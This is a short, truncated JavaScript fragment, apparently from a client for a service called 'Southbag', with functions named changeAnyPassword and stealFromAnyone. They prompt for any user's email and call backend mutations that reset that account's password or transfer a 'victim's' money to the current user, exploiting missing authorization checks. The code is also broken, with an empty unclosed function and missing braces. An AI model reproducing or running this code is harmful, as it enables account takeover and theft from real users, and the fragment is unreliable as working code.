async function viewAllPasswords() {

async function changeAnyPassword() {
  var targetEmail = prompt('Enter the email of the account to change (anyone works):');
  if (!targetEmail) return;
  var newPwd = prompt('Enter new password for ' + targetEmail + ':');

  var client = getSouthbagClient();
  var result = await client.mutation(convex.anyApi.users.changePassword, { email: targetEmail, newPassword: newPwd });

}

async function stealFromAnyone() {
  var victimEmail = prompt('Enter victim email address:');
  if (!victimEmail) return;

  var myEmail = localStorage.getItem('sb_logged_in_email');
  if (!myEmail) { alert('Log in first so we know where to send the stolen money.'); return; }
  var client = getSouthbagClient();
  var result = await client.mutation(convex.anyApi.users.transferBetweenUsers, {
    fromEmail: victimEmail,
    toEmail: myEmail,

  });
